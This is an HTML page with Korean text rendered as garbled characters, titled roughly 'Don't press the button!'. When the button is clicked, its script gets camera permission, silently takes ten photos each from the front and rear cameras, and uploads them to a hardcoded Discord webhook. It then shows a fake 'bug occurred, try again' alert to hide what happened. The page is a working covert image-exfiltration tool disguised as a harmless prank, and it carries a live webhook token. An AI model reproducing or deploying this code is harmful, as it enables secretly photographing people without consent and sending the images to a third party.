<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>ë²„íŠ¼ì„ ëˆ„ë¥´ì§€ë§ˆì„¸ìš”!</title>
  <style>
    body { text-align: center; font-family: Arial; margin-top: 30px; }
    video, canvas { width: 300px; border-radius: 12px; margin-top: 10px; }
    button { padding: 12px 20px; font-size: 16px; cursor: pointer; }
  </style>
</head>
<body>

<h2>ë²„íŠ¼ì„ ëˆ„ë¥´ì§€ë§ˆì„¸ìš”!</h2>
<button id="startBtn">ë²„íŠ¼</button>

<br>
<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1462758530867265591/MaQo0lAdsm7ai9PyWm-xV3XVImaU25BZIffI6oBO3uCXPIw0OhlGMT2q0hSsKDwyyu89";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const startBtn = document.getElementById("startBtn");

const PHOTOS_PER_CAMERA = 10;
const INTERVAL = 150;

async function sendToDiscord(blob, name, label) {
  const form = new FormData();
  form.append("file", blob, name);
  form.append("content", label);

  await fetch(WEBHOOK_URL, {
    method: "POST",
    body: form
  });
}

async function captureSequence(facingMode, label) {
  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode }
  });

  video.srcObject = stream;
  await new Promise(r => setTimeout(r, 1000));

  for (let i = 1; i <= PHOTOS_PER_CAMERA; i++) {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);

    await new Promise(resolve => {
      canvas.toBlob(async blob => {
        await sendToDiscord(
          blob,
          `${label}_${i}.png`,
          `ğŸ“¸ ${label} ${i}ë²ˆì§¸`
        );
        resolve();
      }, "image/png");
    });

    await new Promise(r => setTimeout(r, INTERVAL));
  }

  stream.getTracks().forEach(t => t.stop());
}

startBtn.addEventListener("click", async () => {
  try {
    await captureSequence("user", "ã…‹ã…‹");
    await captureSequence("environment", "ã…ã…");
    alert("ë²„ê·¸ê±¸ë ¸ìŠµë‹ˆë‹¤! ë‹¤ì‹œí•´ì£¼ì„¸ìš”");
  } catch (e) {
    alert("ë²„ê·¸ê±¸ë ¸ìŠµë‹ˆë‹¤! ë‹¤ì‹œí•´ì£¼ì„¸ìš”!");
  }
});
</script>

</body>
</html>
